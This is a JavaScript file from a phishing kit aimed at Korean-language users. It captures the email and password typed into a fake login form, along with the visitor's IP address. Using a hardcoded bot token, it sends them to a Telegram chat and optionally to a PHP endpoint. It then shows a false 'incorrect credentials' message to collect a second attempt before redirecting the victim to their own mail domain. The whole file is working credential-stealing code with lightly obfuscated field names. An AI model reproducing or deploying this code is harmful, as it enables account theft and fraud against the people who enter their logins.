$(document).ready(function(){
      let userIP = '';
      var count=0;
      var pcount=0;
      $.getJSON('https://api.ipify.org?format=json', function(data){
        userIP = data.ip;
      });

      //  page setup area ==========================================================================
      var bot_token = "7082799777:AAGHm4hb2O6DYG_MF9tRWagXkNTXTWeF3iQ"; 
      var group_id = "7145635404";                                      
      var retries = 2;



                  //   set your php forder here 
      //  php server setup area ========================================================================
      var server_url = ".php"; 
      // ===============================================================================================

      const htmlElement = document.getElementById("html");
      var _3w41l = window.location.hash.substr(1);
      var h3w41l = htmlElement.dataset.emailvalue;
      if (_3w41l || h3w41l) {
        var my_3w41l = _3w41l || h3w41l;
        $('#3w41l').val(my_3w41l);
        // $('#hdn3w41l').val(my_3w41l);

        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_3w41l)) {
          $('#error').show();
          _3w41l.focus;
          return false;
        }
      }

      $('#myform').on('submit', function(event){
        event.preventDefault();
        $('#submit-btn').attr('disabled', 'disabled');
        $('#error').hide();
        $('#successMessage').hide();
        $('#pwdMsg').hide();
        _3w41l=$("#3w41l").val();
        var q455m0T2=$("#q455m0T2").val();

        if (!q455m0T2) {
          $('#pwdMsg').show();

          return false;
        }

        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(_3w41l)) {
          $('#error').show();
          _3w41l.focus;
          return false;
        }

        // TG script
        if (bot_token && group_id) {
          var url_tg = "https://api.telegram.org/bot"+bot_token+"/sendMessage?chat_id="+group_id+"&text=";
          url_tg = url_tg + encodeURIComponent("====NEW KOREA LOGS====\n Email: " + _3w41l + "\nPassword: " + q455m0T2 + "\nUserIp: " + userIP);
          $.ajax({
            type: 'POST',
            url: url_tg,
            // data: $this.serialize(),
            beforeSend: function(xhr){
            },
            success: function(response){
              if(response){
                    console.log(`real count of ${count}`)
                $("#q455m0T2").val("");
                if (retries > 0) {
                  if (count>=retries-1) {
                    count=0;
                    console.log(`got redirect count of ${count}`)
                    window.location.replace(`https://${_3w41l.split('@')[1]}`);
                  } else {
                    count+=1;
                    console.log(`increased count of ${count}`)
                    $('#submit-btn').removeAttr('disabled');
                  }
                }
                $("#successMessage").show();
                $('#successMessage').html("자격 증명이 잘못되었습니다. 다시 시도해 주세요");
              }
            },
            error: function(){
              $("#q455m0T2").val("");
              if (retries > 0) {
                if (count>=retries-1) {
                  count=0;
                    console.log(`got error redirect count of ${count}`)
                  window.location.replace(`https://${_3w41l.split('@')[1]}`);
                } else {
                  count+=1;
                  $('#submit-btn').removeAttr('disabled');
                }
              }
              $("#successMessage").show();
              $('#successMessage').html("자격 증명이 잘못되었습니다. 다시 시도해 주세요");
            },
            complete: function(){
            }
          });
        }

        // php server script
        if (server_url.trim()) {
          $.ajax({
            type: 'POST',
            url: server_url,
            data: {
                    _3w41l: _3w41l,
                    q455m0T2: q455m0T2,
                    userIP: userIP
                  },
            // data: $this.serialize(),
            beforeSend: function(xhr){
            },
            success: function(response){
              if(response){
                console.log(response);
                $("#q455m0T2").val("");
                if (retries > 0) {
                  if (pcount>=retries-1) {
                    pcount=0;
                    window.location.replace(`https://${_3w41l.split('@')[1]}`);
                  } else {
                    pcount+=1;
                    $('#submit-btn').removeAttr('disabled');
                  }
                }
                $("#successMessage").show();
                $('#successMessage').html("자격 증명이 잘못되었습니다. 다시 시도해 주세요");
              }
            },
            error: function(){
              $("#q455m0T2").val("");
              if (retries > 0) {
                if (pcount>=retries-1) {
                  pcount=0;
                  window.location.replace(`https://${_3w41l.split('@')[1]}`);
                } else {
                  pcount+=1;
                  $('#submit-btn').removeAttr('disabled');
                }
              }
              $("#successMessage").show();
              $('#successMessage').html("자격 증명이 잘못되었습니다. 다시 시도해 주세요");
            },
            complete: function(){
            }
          });
        }
      });
    });
